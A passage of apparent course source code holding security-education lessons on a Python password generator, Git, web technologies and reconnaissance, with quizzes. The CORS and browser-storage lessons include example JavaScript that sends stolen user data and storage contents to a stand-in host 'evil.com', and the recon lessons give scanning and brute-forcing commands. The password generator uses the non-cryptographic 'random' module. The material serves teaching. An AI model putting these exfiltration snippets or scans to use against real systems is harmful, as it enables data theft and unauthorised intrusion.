    # Shuffle to avoid predictable pattern
    random.shuffle(password)
    return ''.join(password)

# Test
for _ in range(5):
    pwd = generate_password()
    print(f"{pwd}  (length: {len(pwd)})")
\`\`\`

**Step 4: Add command-line interface:**
\`\`\`python
import random
import string
import sys

def generate_password(length=12, use_symbols=True, use_numbers=True):
    password = []
    password.append(random.choice(string.ascii_lowercase))
    password.append(random.choice(string.ascii_uppercase))
    if use_numbers:
        password.append(random.choice(string.digits))
    if use_symbols:
        password.append(random.choice(string.punctuation))
    chars = string.ascii_letters
    if use_numbers:
        chars += string.digits
    if use_symbols:
        chars += string.punctuation
    for _ in range(length - len(password)):
        password.append(random.choice(chars))
    random.shuffle(password)
    return ''.join(password)

# CLI interface
if __name__ == "__main__":
    length = int(sys.argv[1]) if len(sys.argv) > 1 else 12
    count = int(sys.argv[2]) if len(sys.argv) > 2 else 1
    
    for i in range(count):
        print(f"[{i+1}] {generate_password(length)}")
\# Run: python3 generate.py 16 5
\`\`\`

**Step 5: Save passwords to file:**
\`\`\`python
def save_passwords(passwords, filename="generated_passwords.txt"):
    """Save passwords to a file."""
    with open(filename, "w") as f:
        for i, pwd in enumerate(passwords, 1):
            f.write(f"{i}. {pwd}\\n")
    print(f"[+] Saved {len(passwords)} passwords to {filename}")

# Generate and save
passwords = [generate_password(16) for _ in range(10)]
save_passwords(passwords)
\`\`\`

This progression shows how to build real tools: start with a simple function, add features, create a CLI, add file output. This is exactly how security tools are built.`, { hasQuiz: true, quiz: [
        { id: 'py-10-q1', question: 'What does `random.shuffle()` do to a list?', options: ['Sorts it', 'Reverses it', 'Randomizes the order', 'Removes duplicates'], correctIndex: 2, explanation: 'random.shuffle() randomly reorders the elements of a list in place.' },
        { id: 'py-10-q2', question: 'What string module attribute contains all punctuation characters?', options: ['string.punct', 'string.punctuation', 'string.special', 'string.symbols'], correctIndex: 1, explanation: 'string.punctuation contains all standard punctuation characters like !"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~.' },
      ] }),
  ],

  'git-github-101': [
    l('git-1', 'What is Version Control?',
      `**Version control** tracks every change you make to your files. Think of it like a "save game" for your code — you can go back to any previous state.

Git is the most popular version control system. It's used by every major tech company and open-source project.

Without Git:
- You end up with files like \`report-final-v2-really-final-v3.docx\`
- Collaborating means emailing files back and forth
- Mistakes can't be undone

With Git:
- Every change is recorded with a message explaining what changed
- Multiple people can work on the same code simultaneously
- You can experiment on branches without breaking the main code
- Mistakes can be reverted instantly

\`\`\`bash
git --version
# Check if Git is installed
\`\`\`

If you don't have Git, install it: \`sudo apt install git\` (Linux) or download from git-scm.com.`),

    l('git-2', 'Your First Repository',
      `A **repository** (or "repo") is a folder that Git is watching. Let's create one.

\`\`\`bash
mkdir my-first-repo
cd my-first-repo
git init
\`\`\`

\`git init\` creates a hidden \`.git\` folder where Git stores all the tracking data.

Now create a file and track it:

\`\`\`bash
echo "# My First Repo" > README.md
git status
\`\`\`

\`\`\`
On branch master
No commits yet
Untracked files:
  README.md
\`\`\`

\`README.md\` is "untracked" — Git sees it but isn't watching it yet.

\`\`\`bash
git add README.md     # Stage the file (prepare for commit)
git status            # Now it's "staged"
git commit -m "Initial commit: add README"
\`\`\`

The **commit** saves your changes permanently. The \`-m\` flag adds a message describing what you changed. Good commit messages are short but descriptive.

\`\`\`bash
# View your commit history
git log --oneline
\`\`\`

The workflow: **edit → git add → git commit**. Repeat.`),

    l('git-3', 'Branching & Merging',
      `**Branches** let you work on different versions of your code simultaneously. The default branch is called \`main\` (or \`master\`).

\`\`\`bash
# List all branches (* shows current)
git branch

# Create a new branch
git branch feature-scanner

# Switch to the new branch
git checkout feature-scanner

# Or do both in one command
git checkout -b feature-scanner
\`\`\`

Now any changes you commit go into \`feature-scanner\`, not \`main\`. You can switch back to \`main\` anytime with \`git checkout main\`.

Once your feature is ready, **merge** it back:

\`\`\`bash
git checkout main
git merge feature-scanner
\`\`\`

If two people edited the same file differently, you'll get a **merge conflict**:

\`\`\`
<<<<<<< HEAD
Your changes
=======
Their changes
>>>>>>> feature-scanner
\`\`\`

Fix the conflict by editing the file, removing the markers, then:

\`\`\`bash
git add file.txt
git commit -m "Resolve merge conflict"
\`\`\`

Branches are the superpower of Git — they let you experiment freely without fear.`),

    l('git-4', 'Working with GitHub',
      `**GitHub** is a cloud service that hosts Git repositories. It lets you back up your code, collaborate with others, and contribute to open-source projects.

First, create an account at github.com and create an empty repository.

Connect your local repo to GitHub:

\`\`\`bash
# Add GitHub as a remote (do this once)
git remote add origin https://github.com/YOUR_USERNAME/my-first-repo.git

# Push your code to GitHub
git push -u origin main
\`\`\`

The \`-u\` flag sets up tracking so future pushes can just be \`git push\`.

**Pull** to get the latest changes from GitHub:

\`\`\`bash
git pull
\`\`\`

**Clone** to download a repo for the first time:

\`\`\`bash
git clone https://github.com/username/repo.git
\`\`\`

The standard collaboration flow:

\`\`\`bash
# 1. Get latest changes
git pull

# 2. Create a branch for your work
git checkout -b my-feature

# 3. Make changes and commit
git add .
git commit -m "Add my feature"

# 4. Push your branch to GitHub
git push -u origin my-feature

# 5. Create a Pull Request on GitHub
# 6. After merge, switch back and update
git checkout main
git pull
\`\`\``),

    l('git-5', 'Pull Requests & Collaboration',
      `A **Pull Request (PR)** is how you propose changes to a project. Instead of pushing directly to \`main\`, you push a branch and ask the maintainers to review and merge your changes.

**Forking** a repo creates your own copy under your GitHub account. This is how you contribute to projects you don't own.

\`\`\`bash
# Fork on GitHub, then clone your fork
git clone https://github.com/YOUR_USERNAME/some-project.git
cd some-project

# Add the original repo as "upstream"
git remote add upstream https://github.com/ORIGINAL_OWNER/some-project.git

# Keep your fork updated
git pull upstream main
\`\`\`

**Best practices:**
- Write clear commit messages: \`"fix: handle timeout error"\` not \`"fixed stuff"\`
- Keep commits small and focused on one change
- Pull before you push to avoid conflicts
- Review your own PR before asking others to review

\`\`\`bash
# Useful Git commands cheat sheet
git status            # What's changed?
git diff              # Show unstaged changes
git log --oneline     # Compact commit history
git stash             # Temporarily save changes
git stash pop         # Restore stashed changes
git reset HEAD file   # Unstage a file
git checkout -- file  # Discard local changes to a file
\`\`\`

Git and GitHub are essential tools for any developer or hacker. Every security tool, exploit, and framework lives on GitHub.`, { hasQuiz: true, quiz: [
        { id: 'git-5-q1', question: 'What is a Pull Request?', options: ['A request to download code', 'A proposal to merge changes from one branch to another', 'A command to pull latest changes', 'A request to delete a repository'], correctIndex: 1, explanation: 'A Pull Request proposes changes from one branch to another, allowing code review before merging.' },
        { id: 'git-5-q2', question: 'What does `git stash` do?', options: ['Deletes changes permanently', 'Temporarily saves uncommitted changes', 'Creates a backup branch', 'Stops tracking a file'], correctIndex: 1, explanation: 'git stash temporarily saves modified tracked files so you can work on something else, then restore them later.' },
        { id: 'git-5-q3', question: 'How do you unstage a file?', options: ['git remove file', 'git reset HEAD file', 'git unstage file', 'git checkout file'], correctIndex: 1, explanation: 'git reset HEAD file removes the file from the staging area without losing changes.' },
      ] }),

    l('git-6', '.gitignore & Project Configuration',
      `Not every file should be tracked. The \`.gitignore\` file tells Git which files to ignore.

**Basic .gitignore:**
\`\`\`bash
# Create a .gitignore file
cat > .gitignore << 'EOF'
# Dependencies
node_modules/
vendor/
*.pyc

# Build outputs
dist/
build/
*.exe
*.dll

# Environment
.env
.env.local
*.env

# IDE files
.vscode/
.idea/
*.swp
*.swo

# OS files
.DS_Store
Thumbs.db

# Logs
*.log
logs/

# Secrets
*.key
*.pem
secrets.txt
EOF
\`\`\`

**Check what Git is tracking:**
\`\`\`bash
# See what would be ignored
git status --ignored

# Check if a specific file is ignored
git check-ignore -v config.env

# List all ignored files
git ls-files --others --ignored --exclude-standard
\`\`\`

**Global .gitignore (for all repos):**
\`\`\`bash
# Create a global gitignore
git config --global core.excludesFile ~/.gitignore_global

# Add common OS files
echo ".DS_Store" >> ~/.gitignore_global
echo "Thumbs.db" >> ~/.gitignore_global
\`\`\`

**Track empty directories (Git doesn't track them):**
\`\`\`bash
# Git doesn't track empty directories
# Place a .gitkeep file to force tracking
touch logs/.gitkeep
git add logs/.gitkeep
\`\`\``),

    l('git-7', 'Rebasing & History Management',
      `Rebasing rewrites history for a cleaner commit log. Use it to maintain a linear project history.

**Basic rebase workflow:**
\`\`\`bash
# You're on a feature branch, want latest main
git checkout feature
git rebase main
# This replays your feature commits ON TOP of main
\`\`\`

**Interactive rebase — squash, reorder, edit commits:**
\`\`\`bash
# Rebase last 3 commits interactively
git rebase -i HEAD~3

# You'll see a list like:
# pick abc1234 Add scanner
# pick def5678 Fix bug in scanner
# pick 789abcd Add documentation

# Change "pick" to:
# squash (s)  — combine with previous commit
# reword (r)  — change commit message
# edit (e)    — modify this commit
# drop (d)    — delete this commit
# fixup (f)   — squash but discard message
\`\`\`

**Squash commits before pushing:**
\`\`\`bash
# Before pushing, squash WIP commits into one clean commit
git rebase -i HEAD~5
# Change all except the first from "pick" to "squash"
# Write a single good commit message
\`\`\`

**Cherry-pick — pick specific commits:**
\`\`\`bash
# Take a specific commit from another branch
git cherry-pick abc1234

# Cherry-pick multiple commits
git cherry-pick abc1234 def5678
\`\`\`

**Revert vs Reset:**
\`\`\`bash
# Revert creates a NEW commit that undoes changes (safe for shared branches)
git revert HEAD

# Reset moves the branch pointer (careful with shared branches!)
git reset --soft HEAD~1    # Keep changes staged
git reset --mixed HEAD~1   # Keep changes unstaged (default)
git reset --hard HEAD~1    # Discard changes completely!
\`\`\`

**When NOT to rebase:**
- Never rebase commits that have been pushed to a shared branch
- Git will warn you if you try
- Use merge instead of rebase on public branches`),

    l('git-8', 'Collaboration Workflows & Open Source',
      `Real-world Git is about collaboration. Understanding workflows makes you an effective team member.

**GitHub Flow (simple, common):**
\`\`\`bash
# 1. Branch from main
git checkout -b feature/awesome-hack

# 2. Make changes, commit
git add .
git commit -m "Add awesome hack feature"

# 3. Push branch
git push -u origin feature/awesome-hack

# 4. Open Pull Request on GitHub
# 5. Review, discuss, fix
# 6. Merge via GitHub UI
# 7. Delete the branch
\`\`\`

**Keep your fork updated:**
\`\`\`bash
# Add upstream remote
git remote add upstream https://github.com/original/repo.git

# Fetch upstream changes
git fetch upstream

# Merge into your main
git checkout main
git merge upstream/main

# Or rebase
git rebase upstream/main
\`\`\`

**Resolve merge conflicts (the right way):**
\`\`\`bash
# When merge conflicts happen:
# 1. Open the conflicting file
# 2. Look for markers:
# <<<<<<< HEAD
# your changes
# =======
# their changes
# >>>>>>> feature-branch

# 3. Edit to keep the correct version (or combine both)
# 4. Remove the markers
# 5. Save, then:
git add resolved-file.txt
git commit -m "Resolve merge conflict in resolved-file.txt"
\`\`\`

**Git hooks — automate checks:**
\`\`\`bash
# Hooks run automatically on certain actions
# Located in .git/hooks/

# pre-commit hook example (check for secrets)
cat > .git/hooks/pre-commit << 'EOF'
#!/bin/bash
if git diff --cached | grep -q "password\|secret\|api_key"; then
    echo "ERROR: Found potential secret in commit!"
    exit 1
fi
EOF
chmod +x .git/hooks/pre-commit
\`\`\`

**Useful Git aliases for efficiency:**
\`\`\`bash
# Configure useful shortcuts
git config --global alias.lg "log --oneline --graph --all --decorate"
git config --global alias.undo "reset --soft HEAD~1"
git config --global alias.last "log -1 HEAD"
git config --global alias.unstage "reset HEAD --"

# Now use them:
git lg    # Beautiful commit graph
git undo  # Undo last commit (keep changes)
\`\`\`

**Practical progression:**
\`\`\`bash
# 1. Clone a security tool from GitHub
git clone https://github.com/danielmiessler/SecLists.git
cd SecLists

# 2. View the log
git log --oneline -5

# 3. Create a branch for your custom wordlist
git checkout -b my-custom-list

# 4. Make changes, commit, push
# (This is how you contribute to open source!)
\`\`\``),
  ],

  'web-technologies-101': [
    l('web-1', 'How the Web Works',
      `When you visit a website, your browser (the **client**) sends a request to a **server**, and the server sends back a response.

The full process:
1. You type \`https://example.com\` into your browser
2. Browser asks DNS: "What's the IP of example.com?"
3. DNS responds: "93.184.216.34"
4. Browser connects to that IP on port 443 (HTTPS)
5. Browser sends an HTTP request: "Give me /"
6. Server sends back HTML, CSS, and JavaScript
7. Browser renders the page

Every piece of this chain can be inspected, intercepted, or attacked.

\`\`\`bash
# See the raw HTTP conversation
curl -v https://example.com
\`\`\`

The \`-v\` (verbose) flag shows the full request and response headers, not just the body.`),

    l('web-2', 'HTTP Deep Dive',
      `HTTP is a text-based protocol. You can read and write HTTP by hand.

**Request structure:**
\`\`\`http
GET /page.html HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=abc123
\`\`\`

- First line: **METHOD** + **path** + **HTTP version**
- Headers: key-value pairs with metadata
- Blank line separates headers from body
- Body: data sent with POST/PUT requests

**Common headers:**
- \`Host\` — the target website (virtual hosting)
- \`Cookie\` — session data sent with each request
- \`User-Agent\` — browser identification
- \`Content-Type\` — format of the request body
- \`Authorization\` — credentials (Bearer tokens, Basic auth)

**Response structure:**
\`\`\`http
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: session=xyz789; HttpOnly

<html>...</html>
\`\`\`

\`\`\`bash
# See only the response headers
curl -I https://example.com

# See everything
curl -v https://example.com
\`\`\``),

    l('web-3', 'HTML & Forms',
      `HTML forms are how users send data to servers. Every login form, search box, and contact form is an HTML form.

\`\`\`html
<form action="/login" method="POST">
  <input type="text" name="username" placeholder="Username">
  <input type="password" name="password" placeholder="Password">
  <button type="submit">Login</button>
</form>
\`\`\`

When submitted, the browser sends:
\`\`\`http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=secret123
\`\`\`

**Input types** determine how the browser handles data:
- \`text\` — plain text
- \`password\` — masked input
- \`email\` — validates email format
- \`hidden\` — not visible to users but sent with the form
- \`file\` — file upload (uses \`multipart/form-data\`)

**Hidden fields** are interesting from a security perspective:

\`\`\`html
<input type="hidden" name="role" value="user">
<input type="hidden" name="price" value="19.99">
\`\`\`

These can be modified by the client before submission — never trust hidden fields on the server.`),

    l('web-4', 'Sessions & Authentication',
      `HTTP is **stateless** — each request is independent. Servers use **sessions** to remember who you are.

When you log in:
1. Server verifies your credentials
2. Server creates a session (stored on the server)
3. Server sends you a **session ID** in a cookie
4. Your browser sends this cookie with every subsequent request
5. Server looks up the session ID to identify you

\`\`\`http
# Server response after login
HTTP/1.1 200 OK
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax
\`\`\`

**Cookie flags:**
- \`HttpOnly\` — JavaScript can't read this cookie (prevents XSS theft)
- \`Secure\` — only sent over HTTPS
- \`SameSite\` — prevents CSRF attacks

**The Same-Origin Policy** is a browser security feature that prevents scripts from one site accessing data from another. This is why cross-site scripting (XSS) attacks are dangerous — they bypass this policy by running in the context of the target site.

\`\`\`bash
# Check if a site uses secure cookies
curl -I https://example.com | grep -i set-cookie
\`\`\``),

    l('web-5', 'REST APIs',
      `**REST APIs** are how web applications talk to each other. Instead of returning HTML, they return data (usually JSON).

A typical API request:

\`\`\`bash
curl https://api.github.com/users/octocat
\`\`\`

\`\`\`json
{
  "login": "octocat",
  "id": 1,
  "avatar_url": "https://avatars.githubusercontent.com/u/1?v=4",
  "public_repos": 8
}
\`\`\`

**Common API patterns:**
- \`GET /api/users\` — list users
- \`GET /api/users/1\` — get user with ID 1
- \`POST /api/users\` — create a user (send JSON body)
- \`PUT /api/users/1\` — update user 1
- \`DELETE /api/users/1\` — delete user 1

\`\`\`bash
# POST JSON data to an API
curl -X POST https://api.example.com/users \\
  -H "Content-Type: application/json" \\
  -d '{"username": "hacker", "role": "admin"}'

# Include an API key
curl -H "Authorization: Bearer YOUR_TOKEN" \\
  https://api.example.com/protected
\`\`\`

**API keys** and tokens are how services authenticate API requests. If you find an exposed API key in JavaScript code or network traffic, you can impersonate that user.`, { hasQuiz: true, quiz: [
        { id: 'web-5-q1', question: 'What format do REST APIs typically return data in?', options: ['XML', 'HTML', 'JSON', 'CSV'], correctIndex: 2, explanation: 'REST APIs typically return JSON (JavaScript Object Notation) as the data format.' },
        { id: 'web-5-q2', question: 'Which HTTP method is used to create a new resource?', options: ['GET', 'POST', 'PUT', 'DELETE'], correctIndex: 1, explanation: 'POST is used to create new resources. PUT is for updating existing ones.' },
        { id: 'web-5-q3', question: 'What does the Authorization header typically contain?', options: ['Session cookie', 'Bearer token or API key', 'Content type', 'User agent'], correctIndex: 1, explanation: 'The Authorization header carries credentials like Bearer tokens, Basic auth, or API keys.' },
      ] }),

    l('web-6', 'CORS & Same-Origin Policy',
      `The Same-Origin Policy (SOP) is the browser's most important security feature. CORS relaxes it — but dangerously if misconfigured.

**Same-Origin Policy basics:**
\`\`\`bash
# Two URLs have the same origin if:
# Protocol + Host + Port are identical

# Same origin:
# https://example.com/page1
# https://example.com/page2

# Different origin:
# https://example.com     (different port)
# http://example.com      (different protocol)
# https://api.example.com (different host)
\`\`\`

**What SOP blocks:**
\`\`\`javascript
// This would be blocked if https://evil.com tries to read
// a response from https://bank.com
fetch('https://bank.com/api/balance')
  .then(r => r.json())
  .then(data => console.log(data))
// BLOCKED by Same-Origin Policy
\`\`\`

**CORS headers — how servers allow cross-origin:**
\`\`\`bash
# Check CORS headers on a target
curl -I https://example.com | grep -i "access-control"

# A permissive CORS policy (dangerous):
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true

# A restrictive CORS policy (safe):
# Access-Control-Allow-Origin: https://trusted-site.com
\`\`\`

**Test for CORS misconfiguration:**
\`\`\`bash
# Reflect the Origin header back (vulnerable!)
curl -H "Origin: https://evil.com" -I https://target.com/api | grep -i "access-control"

# If you see: Access-Control-Allow-Origin: https://evil.com
# AND: Access-Control-Allow-Credentials: true
# The site is vulnerable to CORS-based data theft
\`\`\`

**Preflight requests (OPTIONS):**
\`\`\`bash
# For non-simple requests, browser sends OPTIONS first
curl -X OPTIONS -H "Origin: https://test.com" -H "Access-Control-Request-Method: DELETE" https://api.target.com/data -v

# Response shows what's allowed:
# Access-Control-Allow-Methods: DELETE, PUT
# Access-Control-Allow-Headers: Authorization
\`\`\`

**CORS exploitation scenario:**
\`\`\`javascript
// If example.com/api/user has:
// Access-Control-Allow-Origin: *
// Access-Control-Allow-Credentials: true

// An attacker's site can:
fetch('https://example.com/api/user', {credentials: 'include'})
  .then(r => r.json())
  .then(data => fetch('https://evil.com/steal?data=' + JSON.stringify(data)))
\`\`\`

**Security checklist:**
- Never use \`Access-Control-Allow-Origin: *\` with credentials
- Whitelist specific origins, don't reflect the Origin header
- Use \`Vary: Origin\` header for dynamic CORS
- Don't rely on CORS alone for security — use proper auth`),

    l('web-7', 'Browser Storage & Client-Side Security',
      `Modern browsers provide multiple storage mechanisms. Each has different security properties.

**Types of browser storage:**
\`\`\`
Cookies        — 4KB limit, sent with every request, HttpOnly/Secure
localStorage   — 5-10MB, never sent automatically, accessible via JS
sessionStorage — Same as localStorage, cleared on tab close
IndexedDB      — Large structured data, async API
\`\`\`

**localStorage vs Cookies:**
\`\`\`javascript
// localStorage — persists until explicitly deleted
localStorage.setItem('token', 'abc123');
localStorage.getItem('token');  // "abc123"
localStorage.removeItem('token');
localStorage.clear();

// sessionStorage — cleared when tab closes
sessionStorage.setItem('temp', 'data');

// Cookies — sent with every HTTP request
document.cookie = "session=abc123; path=/; Secure";
\`\`\`

**XSS + Storage = Game Over:**
\`\`\`javascript
// If an attacker has XSS, they can steal ALL storage:
// localStorage
const allData = {};
for (let key in localStorage) {
    allData[key] = localStorage.getItem(key);
}

// sessionStorage
for (let key in sessionStorage) {
    allData[key] = sessionStorage.getItem(key);
}

// Send to attacker
fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify(allData)
});
\`\`\`

**Check what's stored in your browser:**
\`\`\`javascript
// In browser console:
console.log(localStorage);
console.log(sessionStorage);
console.log(document.cookie);
\`\`\`

**Security best practices for storage:**
\`\`\`
// DO store:   Non-sensitive preferences, theme, language
// DON'T store: JWT tokens, API keys, PII, secrets

// Better alternatives:
// - Use httpOnly cookies for session tokens
// - Use backend sessions instead of client storage
// - Encrypt sensitive data before storing
\`\`\`

**Web Storage API vs Cookies:**
\`\`\`bash
# Check what cookies a site sets
curl -I https://example.com | grep "Set-Cookie"

# Check for secure cookie flags
curl -s -I https://example.com | grep -i "HttpOnly\|Secure\|SameSite"
\`\`\`

The rule: tokens in httpOnly cookies (protected from XSS), non-sensitive prefs in localStorage, and never store secrets in client-side storage.`),

    l('web-8', 'Browser Security Features',
      `Modern browsers have built-in defenses. Understanding them helps you both exploit and defend.

**Content Security Policy (CSP):**
\`\`\`bash
# Check a site's CSP header
curl -s -I https://example.com | grep -i "content-security-policy"

# Example CSP:
# Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com

# Directives:
# default-src  — fallback for all resource types
# script-src   — which scripts can execute
# style-src    — which stylesheets can be used
# img-src      — which images can load
# connect-src  — which URLs can be fetched via JS
# frame-src    — which sites can be iframed
\`\`\`

**Evaluate CSP effectiveness:**
\`\`\`bash
# Weak CSP (allows XSS)
# script-src 'self' 'unsafe-inline'

# Strong CSP (blocks most XSS)
# script-src 'self' 'nonce-random123'

# Check CSP evaluator (Google's tool):
# https://csp-evaluator.withgoogle.com/
\`\`\`

**HTTP security headers checklist:**
\`\`\`bash
# Check all security headers at once
curl -s -I https://example.com | grep -iE "Strict-Transport|Content-Security|X-Content-Type|X-Frame-Options|Referrer-Policy|Permissions-Policy"

# What to look for:
# ✓ Strict-Transport-Security  (HSTS — force HTTPS)
# ✓ X-Content-Type-Options: nosniff  (prevent MIME sniffing)
# ✓ X-Frame-Options: DENY  (prevent clickjacking)
# ✓ Referrer-Policy: strict-origin  (control referrer data)
# ✓ Permissions-Policy  (control browser features)
\`\`\`

**Subresource Integrity (SRI):**
\`\`\`bash
# SRI ensures CDN files haven't been tampered with
# <script src="https://cdn.example.com/lib.js"
#         integrity="sha384-abc123..."
#         crossorigin="anonymous">

# Generate SRI hash
openssl dgst -sha384 -binary jquery.min.js | openssl base64 -A
\`\`\`

**Browser feature policies:**
\`\`\`bash
# Permissions-Policy controls what APIs the page can use
# Permissions-Policy: camera=(), microphone=(), geolocation=(self "https://trusted.com")

# Check what features a page requests:
# Open DevTools → Application → Permissions
\`\`\`

**How attackers bypass browser security:**
\`\`\`
1. CSP bypass via JSONP endpoints
2. CSP bypass via file upload endpoints (same-origin)
3. SOP bypass via DNS rebinding
4. HSTS bypass via HTTP downgrade (rare)
5. Iframe sandbox escape via plugin vulnerabilities
\`\`\`

Understanding browser security is essential for both finding XSS and preventing it. Every missing header is a potential vulnerability.`),
  ],

  'web-recon-101': [
    l('recon-1', 'What is Reconnaissance?',
      `**Reconnaissance** (recon) is the first phase of any security assessment. It's about gathering information about your target before launching any attacks.

There are two types:

**Passive Recon** — gathering information without directly interacting with the target:
- Searching Google, Shodan, Censys
- Checking social media and job postings
- Analyzing certificate transparency logs
- Using WHOIS and DNS records

**Active Recon** — directly interacting with the target's systems:
- Scanning ports with Nmap
- Browsing the website
- Sending probes to discover endpoints
- Directory enumeration

Passive recon leaves no traces. Active recon creates logs on the target's systems. Always start with passive recon.

\`\`\`bash
# Passive: DNS info
dig target.com ANY

# Active: basic web request (leave logs!)
curl -I https://target.com
\`\`\`

The rule: **passive first, active second, exploit last**.`),

    l('recon-2', 'WHOIS & DNS Enumeration',
      `**WHOIS** tells you who owns a domain. This is passive recon — it's public information.

\`\`\`bash
# Basic WHOIS lookup
whois example.com
\`\`\`

WHOIS reveals: registrant name, organization, email, phone, creation/expiration dates, name servers.

**DNS enumeration** reveals more:

\`\`\`bash
# Standard lookups
dig target.com A          # IPv4 addresses
dig target.com AAAA       # IPv6 addresses
dig target.com MX         # Mail servers
dig target.com NS         # Name servers
dig target.com TXT        # Text records (SPF, DKIM, etc.)
dig target.com CNAME      # Canonical names (aliases)

# Zone transfer (rarely works but always worth trying)
dig axfr @ns1.target.com target.com
\`\`\`

A **zone transfer** copies the entire DNS database. Most servers block this, but if it works, you get every subdomain and record.

\`\`\`bash
# Automatic DNS bruteforce with dnsrecon (install first)
dnsrecon -d target.com -D /usr/share/wordlists/dns.txt -t brt
\`\`\`

This tries thousands of common subdomain names. Install with: \`sudo apt install dnsrecon\``),

    l('recon-3', 'Subdomain Enumeration',
      `Subdomains often reveal hidden services, staging environments, and forgotten applications.

**Tools for subdomain enumeration:**

\`\`\`bash
# Sublist3r — uses search engines and DNS
sublist3r -d target.com

# Amass — more thorough, uses many sources
amass enum -d target.com

# Assetfinder — quick and simple
assetfinder --subs-only target.com
\`\`\`

**Why enumerate subdomains?**
- \`admin.target.com\` — admin panel
- \`dev.target.com\` — development server (less secure)
- \`api.target.com\` — API endpoint
- \`test.target.com\` — testing environment
- \`jenkins.target.com\` — CI/CD (often misconfigured)
- \`vpn.target.com\` — VPN access point
- \`git.target.com\` — internal Git server

\`\`\`bash
# Verify found subdomains resolve
for sub in $(cat subdomains.txt); do
    if host "$sub.target.com" > /dev/null 2>&1; then
        echo "$sub.target.com resolves"
    fi
done
\`\`\`

Certificate Transparency logs are also a goldmine:

\`\`\`bash
# Using crt.sh (passive)
curl -s "https://crt.sh/?q=%25.target.com&output=json" \\
  | jq -r '.[].name_value' \\
  | sort -u
\`\`\`

This pulls every SSL certificate issued for \`*.target.com\` and \`target.com\` — a passive way to discover subdomains.`),

    l('recon-4', 'Directory Brute-Forcing',
      `Once you know a host, you need to find hidden files and directories. This is called **directory enumeration** or **directory brute-forcing**.

\`\`\`bash
# ffuf — the modern choice (fast, flexible)
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/common.txt

# dirb — simpler but effective
dirb https://target.com /usr/share/wordlists/common.txt

# gobuster — another solid option
gobuster dir -u https://target.com -w /usr/share/wordlists/common.txt
\`\`\`

**Common discovery:**
- \`/admin\` , \`/login\` — authentication pages
- \`/backup\` , \`/backups\` — backup files
- \`/.git\` — exposed Git repository
- \`/.env\` — environment variables with secrets
- \`/wp-admin\` , \`/wp-content\` — WordPress
- \`/api\` , \`/v1\` , \`/v2\` — API endpoints
- \`/robots.txt\` — hidden paths listed by the developer
- \`/sitemap.xml\` — all pages the site wants indexed

\`\`\`bash
# ffuf with filtering (hide 404s)
ffuf -u https://target.com/FUZZ \\
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \\
  -fc 404

# File extension brute-forcing
ffuf -u https://target.com/FUZZ.bak \\
  -w /usr/share/seclists/Discovery/Web-Content/common.txt
\`\`\`

**Wordlists** make the difference. The SecLists collection is the standard:

\`\`\`bash
sudo apt install seclists
# Lists are in /usr/share/seclists/
\`\`\``),

    l('recon-5', 'Technology Fingerprinting',
      `**Fingerprinting** identifies the technologies a website uses — the web server, framework, CMS, JavaScript libraries, and more.

**Manual fingerprinting:**

\`\`\`bash
# Check response headers — they reveal server info
curl -I https://target.com
\`\`\`

\`\`\`
HTTP/1.1 200 OK
Server: nginx/1.24.0
X-Powered-By: PHP/8.2
X-Generator: Drupal 10
\`\`\`

Each header tells you what's running.

\`\`\`bash
# Automated fingerprinting with WhatWeb
whatweb https://target.com

# Wappalyzer browser extension (passive in-browser detection)
# Visit https://www.wappalyzer.com/ or install the extension
\`\`\`

WhatWeb output:
\`\`\`
https://target.com [200] Apache[2.4.57], Cookie[PHPSESSID],
HTML5, HTTPServer[Apache/2.4.57], PHP[8.2.0],
WordPress[6.4], jQuery[3.7.1]
\`\`\`

**Why fingerprint matters:**
- Knowing the exact version tells you which CVEs apply
- WordPress sites have known admin paths and vulnerable plugins
- Apache vs Nginx vs IIS have different default configurations
- PHP vs Python vs Node suggest different attack surfaces

\`\`\`bash
# More detailed with WPScan (for WordPress)
wpscan --url https://target.com
\`\`\``),

    l('recon-6', 'Building a Recon Report',
      `Let's put it all together into a systematic recon workflow.

**Phase 1: Passive Recon**

\`\`\`bash
# 1. WHOIS
whois target.com > recon/whois.txt

# 2. DNS enumeration
dig target.com ANY > recon/dns.txt

# 3. Subdomain discovery (passive)
curl -s "https://crt.sh/?q=%25.target.com&output=json" \\
  | jq -r '.[].name_value' | sort -u > recon/subdomains.txt

# 4. Technology lookup
whatweb target.com > recon/tech.txt
\`\`\`

**Phase 2: Active Recon**

\`\`\`bash
# 1. Basic port scan
nmap -sS -sV -F target.com -oN recon/nmap.txt

# 2. Directory enumeration
ffuf -u https://target.com/FUZZ \\
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \\
  -o recon/dirs.json

# 3. Verify subdomains
for sub in $(cat recon/subdomains.txt); do
    curl -sI "https://$sub" -o /dev/null -w "%{http_code} $sub\\n"
done > recon/live-subdomains.txt
\`\`\`

**Phase 3: Analysis**

Review your findings and look for:
- Unusual ports or services
- Admin panels and login pages
- Exposed configuration files
- Outdated software versions
- Subdomains with different technologies

Save everything in a structured format. Documentation is as important as discovery.`, { hasQuiz: true, quiz: [
        { id: 'recon-6-q1', question: 'What is the first phase of a security assessment?', options: ['Exploitation', 'Reconnaissance', 'Reporting', 'Privilege Escalation'], correctIndex: 1, explanation: 'Reconnaissance is always the first phase — you must gather information before you can attack.' },
        { id: 'recon-6-q2', question: 'What tool would you use for passive subdomain enumeration?', options: ['nmap', 'curl against crt.sh', 'hydra', 'sqlmap'], correctIndex: 1, explanation: 'crt.sh queries Certificate Transparency logs — a passive way to find subdomains without touching the target.' },
        { id: 'recon-6-q3', question: 'What is the difference between passive and active reconnaissance?', options: ['Passive is faster', 'Passive leaves no logs on the target', 'Active is always illegal', 'Passive requires more tools'], correctIndex: 1, explanation: 'Passive reconnaissance gathers information without directly interacting with the target, leaving no trace.' },
      ] }),

    l('recon-7', 'Google Hacking & Advanced Dorking',
      `Google indexes everything. Google Dorking finds the sensitive data that wasn't meant to be public.

**Essential Google dorks:**
\`\`\`bash
# Search operators you type into Google:
# site:             Limit to a domain
# inurl:            Word must appear in URL
# intitle:          Word must appear in page title
# filetype:         Specific file format
